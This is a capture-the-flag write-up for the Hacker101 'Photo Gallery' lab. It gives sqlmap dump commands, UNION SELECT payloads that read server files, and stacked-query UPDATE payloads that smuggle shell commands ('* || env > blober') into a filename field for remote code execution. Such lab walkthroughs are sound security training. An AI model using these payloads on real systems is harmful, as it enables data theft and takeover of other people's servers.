<h2>Target: Photo Gallery</h2>

<b>Flag 1:</b><br>
Visiting the site shows: 
 
![image](https://user-images.githubusercontent.com/93153300/206507963-0c52d371-dc2f-490d-829e-da6ccd62991c.png)

Checking the source code shows:
 
![image](https://user-images.githubusercontent.com/93153300/206508040-2009af93-bdf6-4336-b0da-cdb0f84aaca3.png)
 
Visit the ‘fetch?id=3’ directory mentioned in the source code.  The page shows an internal server error: 
 
![image](https://user-images.githubusercontent.com/93153300/206508086-299bdae0-4392-4429-93ef-0220bf88d061.png)
 
Test this for sql injection using sqlmap: sqlmap -u "https://1592996c6185f1bb369a07276ec9e331.ctf.hacker101.com/fetch?id=2" --batch -p id

Sqlmap found that it’s vulnerable to boolean-based blind and time-based blind sql injection.  Test this further with sqlmap to find the 1st flag: sqlmap -u "https://1592996c6185f1bb369a07276ec9e331.ctf.hacker101.com/fetch?id=2" --batch -p id -D level5 –tables -T photos --dump
__________________________________________________________________________
<b>Flag 2:</b><br>
Check if we can use the sql injection to read files.  Sqlmap showed there is a file called ‘files/adorable.jpg’.  As a proof of concept let’s try to read this file.  Use the sql injection payload of: https://3a3f7491bd9535647716ab87d25fc400.ctf.hacker101.com/fetch?id=0 union select 'files/adorable.jpg'--
 
![image](https://user-images.githubusercontent.com/93153300/206511702-e2f64f82-8414-4bfb-9649-e9b87ebf634a.png)

The output shows we can read files with the sqli.  HackerOne gives a hint as to which file we should try to read.  The hint says: ‘This application runs on the uwsgi-nginx-flask-docker image.’  Google search for ‘uwsgi nginx’.  We find a github page: https://github.com/tiangolo/uwsgi-nginx-flask-docker. <br>
On the github page we find that uwsgi contains a default file named uwsgi.ini: 
 
![image](https://user-images.githubusercontent.com/93153300/206508151-68a88437-3d59-4906-8928-ad77373cfcfe.png)

The github page shows the contents of the file uwsgi.ini.  Check if we can read this file using the sql injection.  Using burp suite, capture the request for https://3a3f7491bd9535647716ab87d25fc400.ctf.hacker101.com/fetch?id=1. <br>
Change the id=1 to id=0 union select ‘uwsgi.ini’--.  Make sure to url encode the payload:
 
![image](https://user-images.githubusercontent.com/93153300/206518858-a4e01966-d21f-47e6-a3d8-d44720beb8b1.png)

It worked, we find the file and contents to the file shown on the github page.  Using the sql injection, read the main.py file.  Change the id=1 to id=0 union select ‘main.py’--.  Make sure to url encode the payload:
 
![image](https://user-images.githubusercontent.com/93153300/206519396-69f155c9-77b2-4bbc-9df3-4adc8f712252.png)
 
Burp suite’s response contains the 2nd flag.
____________________________________________________________________________
<b>Flag 3:</b><br>
Going back to our sqlmap dump: sqlmap -u "https://8e62cd1d8cac0e9921e839ec01c74382.ctf.hacker101.com/fetch?id=2" --batch -p id --dbs -D level5 --tables -T photos –dump
 
![image](https://user-images.githubusercontent.com/93153300/206508342-3770e8a5-6345-43ee-a8cc-8df222c9b6fb.png)
 
Use burp suite to capture the requet of https://3da97857dc6c25896a7649b006ab3281.ctf.hacker101.com/fetch?id=2 <br>
Send the captured request in burp suite to ‘Repeater’.  Try to modify the image title name using the sqli payload of: id=2;UPDATE photos SET title='blober' WHERE id=3;COMMIT;-- <br>
Make sure to url encode the payload.  
 
![image](https://user-images.githubusercontent.com/93153300/206508383-e9db47bf-af2a-4424-9382-ef3823d6f5d8.png)

Check if the payload worked by visiting the home page:
 
![image](https://user-images.githubusercontent.com/93153300/206508438-8a705391-76a8-42f9-ad67-2e3e53232086.png)

It worked, we see that the title of the third image changed from ‘Invisible’ to the name we gave of ‘blober’.  We will use this to get remote command execution on the target.  

Step 1: Run the following sqli payload to insert the command 'ls': id=2;UPDATE photos SET filename='* || ls > blober' WHERE id=3;COMMIT;-- <br>
Step 2: Visit the main page https://3da97857dc6c25896a7649b006ab3281.ctf.hacker101.com to run the 'ls' command: 
 
![image](https://user-images.githubusercontent.com/93153300/206508495-e388c22e-0e49-4470-b6b8-fe59e820d5b9.png)

We see at the bottom of the page that the ‘Space used’ changed from zero to 196k.  <br>
Step 3: View the output of the command by using the sqli payload of: https://3da97857dc6c25896a7649b006ab3281.ctf.hacker101.com/fetch?id=0 union select 'blober'-- 
 
![image](https://user-images.githubusercontent.com/93153300/206508554-260cce70-c2f8-40d4-8fd7-3ef238c72a16.png)

The output on the page shows a list of the files.  So we see that the command ‘ls’ worked.  <br>
Step 4: Instead of running the command ‘ls’, run the command ‘env’.  Use the sqli payload of: id=2;UPDATE photos SET filename='* || env > blober' WHERE id=3;COMMIT;-- <br>
Visit the page https://3da97857dc6c25896a7649b006ab3281.ctf.hacker101.com to run the command.  Finally, view the output of the command by using the sqli payload of: https://3da97857dc6c25896a7649b006ab3281.ctf.hacker101.com/fetch?id=0 union select 'blober'--
 
![image](https://user-images.githubusercontent.com/93153300/206508603-f964ae97-4589-4fdb-b88a-cc0b18165900.png)

The output shows the flags.  


